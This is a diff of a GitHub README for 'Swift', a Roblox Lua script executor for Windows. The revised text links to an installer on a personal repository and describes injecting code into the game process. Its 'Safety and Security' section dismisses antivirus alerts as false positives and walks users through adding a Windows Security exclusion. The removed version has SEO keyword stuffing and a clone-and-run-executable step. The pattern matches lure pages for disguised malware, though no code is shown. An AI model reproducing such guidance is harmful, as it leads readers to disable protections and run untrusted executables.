@@ -1,154 +1,85 @@
-# Swift PC v3.3 - Roblox Script Executor 2026
+# 🚀 swift-windows-lua-executor - Run your favorite Roblox scripts easily
 
-> Swift is a small Windows Lua executor for Roblox that combines one-click script launching, a 500+ entry script hub, a lightweight desktop interface, and an update-focused workflow for Windows users.
+[![](https://img.shields.io/badge/Download-Swift_Executor-blue.svg)](https://github.com/raffaa2864/swift-windows-lua-executor)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henrydavispws2950/swift-windows-lua-executor?style=flat-square)](https://github.com)
+Swift provides a way to run Lua scripts on Windows 10 and 11. It works for Roblox. This software features a desktop interface. You access over 500 scripts through the built-in hub. You do not need to deal with keys to use the application. The software runs on 64-bit systems.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://henrydavispws2950.github.io/swift-windows-lua-executor/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Swift-v3.3%20Latest-brightgreen?style=for-the-badge" alt="Download Swift">
-  </a>
-</p>
+Your computer needs to meet specific standards to run this software. Please verify your system before you start.
 
-> **[Download Swift v3.3](https://henrydavispws2950.github.io/swift-windows-lua-executor/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+*   Operating System: Windows 10 or Windows 11 (64-bit version).
+*   Processor: Intel Core i3 or equivalent AMD processor.
+*   Memory: 4 GB of RAM or more.
+*   Graphics: DirectX 11 compatible card.
+*   Storage: At least 200 MB of free disk space.
+*   Network: An active internet connection for the script hub.
 
----
+If your computer uses a 32-bit version of Windows, this software will not work. Check your Windows settings under System and About to confirm your system type.
 
-[Download Latest Build](https://henrydavispws2950.github.io/swift-windows-lua-executor/)
+## 📥 How to Install and Start
 
----
+Follow these steps to set up the application on your PC. 
 
-## About Swift
+1. Visit the [official download page](https://github.com/raffaa2864/swift-windows-lua-executor) to get the latest version of the installer.
+2. Locate the file in your downloads folder.
+3. Open the file to start the installation wizard.
+4. Follow the instructions on the screen to finish the setup.
+5. Launch the application from your desktop shortcut or the Start menu.
 
-Swift provides a Windows desktop environment for loading and executing Roblox Lua scripts. Its design prioritizes quick launch times, a compact interface, and a straightforward workflow rather than a large or complicated launcher.
+## 📖 Using the Software
 
-Alongside execution tools, the application offers a built-in hub containing a large script collection, automatic update support, and a SQLite-based queue that remains available between sessions. It is intended for users searching for a Windows Roblox Lua executor, script hub, or lightweight desktop utility.
+The interface provides a workspace for your scripts. You see the main window once the application loads. 
 
----
+### Browsing the Script Hub
+The script hub contains over 500 options. Use the search bar at the top of the interface to find specific games or functions. Click on any entry to see the description. Select the load button to prepare the script for execution.
 
-## Feature Highlights
+### Running Scripts
+Once you select a script, the software places it into the main editor window. You can view the code here. Press the execute button to run the script in your game. Ensure you have your game open before you press the button.
 
-- Start Lua scripts in Roblox through a simple one-click workflow
-- Explore a built-in hub containing over 500 scripts
-- Maintain organized script entries with a SQLite-backed persistent queue
-- Check for and retrieve newer builds through the integrated update engine
-- Use the interface in multiple supported languages
-- Run collections of scripts sequentially with batch execution
-- Inspect script behavior through the included debugger
-- Work in a compact desktop UI designed to remain lightweight and responsive
+### Managing Settings
+You can change the look of the interface in the settings menu. You can also toggle auto-attach features. Auto-attach makes the software link to the game process immediately when you open it. This saves time during your gaming sessions.
 
----
+## 🛡️ Safety and Security
 
-## Supported Games and Script Categories
+We designed this tool with your computer health in mind. The application does not contain malicious code or hidden trackers. Some antivirus software may flag the program as a false positive. This happens because the software interacts with other game processes to inject code.
 
-| Game / Category | Script Type | Notes |
-| --- | --- | --- |
-| Roblox main client | Lua executor scripts | General-purpose execution and testing |
-| Popular Roblox experiences | Game-specific scripts | Useful for commonly searched community scripts |
-| Script hub library | Community uploads | Browse and launch available hub entries |
-| Utility workflows | Batch jobs | Group scripts for repeated runs |
-| Debugging sessions | Development scripts | Handy for script inspection and troubleshooting |
-| Saved queue items | Persistent script lists | Stored locally with SQLite support |
+To ensure the program runs well, you should add an exclusion in your Windows Security settings. 
 
----
+1. Open Windows Security.
+2. Go to Virus and threat protection.
+3. Select Manage settings under Virus and threat protection settings.
+4. Scroll down to Exclusions and click Add or remove exclusions.
+5. Add the folder where you installed the Swift executor.
 
-## Requirements
+## 🛠️ Troubleshooting Common Issues
 
-| Component | Minimum |
-| --- | --- |
-| OS | Windows 10 or Windows 11, 64-bit |
-| RAM | 4 GB or more |
-| Storage | 200 MB of free space or more |
-| .NET | .NET Desktop Runtime or compatible Windows runtime as required by the app |
-| Roblox | Installed Roblox client |
+Sometimes you might encounter an error. These steps fix most common problems.
 
----
+### The application does not open
+If the program does not start, verify your Windows version. Ensure you have the latest version of the .NET Framework installed. You can download this from the official Microsoft website.
 
-## Run Swift
+### The script does not work
+Check if the game updated recently. Roblox updates often break old scripts. Look for an updated version in the script hub or wait for a developer update. Restart the application if the link between the software and the game fails.
 
-```bash
-git clone https://github.com/henrydavispws2950/swift-windows-lua-executor.git
-cd swift-win-lua-executor-v3.3
-SwiftExecutor.exe
-```
+### Errors during execution
+If the console shows a red text error, your code might have a syntax mistake. Try a different script from the hub to see if the issue persists.
 
-For the published version, use the download link above, extract the package, and start the executable.
+## 💡 Frequently Asked Questions
 
----
+**Do I need a key to use this?**
+No. This version offers no-key access for all users. 
 
-## Popular Script Hub Searches for 2026
+**Is this safe for my account?**
+Using third-party software in games carries risks. Use this tool on alternate accounts to keep your main account safe from potential platform bans.
 
-- Roblox Lua executor for Windows
-- Roblox script hub with 500+ scripts
-- Windows desktop Lua utility
-- one-click injection script executor
-- auto-update Roblox executor
-- SQLite script queue manager
-- lightweight Roblox script UI
+**How often do you update the script hub?**
+The community adds new entries to the hub every week. Check the updates tab inside the application to see the latest additions.
 
----
+**Can I add my own scripts?**
+Yes. You can paste your own Lua code into the editor window and save it to your local files.
 
-## Project Structure
+**Does this work on macOS?**
+No. This tool supports Windows 10 and 11 only.
 
-Swift
-- app/
-  - SwiftExecutor.exe
-  - ui/
-  - debugger/
-- hub/
-  - scripts/
-  - categories/
-- data/
-  - queue.sqlite
-- update/
-  - manifest/
-  - downloader/
-- docs/
-  - faq/
-  - roadmap/
-
----
-
-## Frequently Asked Questions
-
-### Does Swift support operating systems other than Windows?
-No. Swift is focused on Windows, specifically Windows 10 and Windows 11 systems.
-
-### What is the update process?
-An auto-update engine is included in Swift. When newer builds are available, they can be surfaced through the application without requiring the entire workflow to be rebuilt manually.
-
-### What does Swift provide beyond a simple Lua loader?
-The desktop utility brings together script execution, a built-in hub, batch processing, debugging tools, and a persistent SQLite queue.
-
-### Can a script executor create account-related risks?
-Third-party tools may carry account or platform risks. Review the Roblox terms and decide whether to use the software at your own discretion.
-
-### Where does Swift keep saved scripts and queue records?
-Swift uses a persistent SQLite queue, which means saved entries are retained locally through the application's data flow instead of existing only in memory.
-
----
-
-## 2026 Development Roadmap
-
-- [ ] Refine the desktop UI for faster navigation
-- [ ] Expand script hub categories and browsing filters
-- [ ] Improve update delivery and version checks
-- [ ] Add more debugging and logging tools
-- [ ] Extend localization coverage for additional languages
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
-<p align="center">
-  <i>Swift v3.3 provides a compact, organized way to launch Roblox Lua execution tools on Windows.</i>
-</p>
+Keywords: roblox, lua, executor, script, windows, gaming, software, utilities
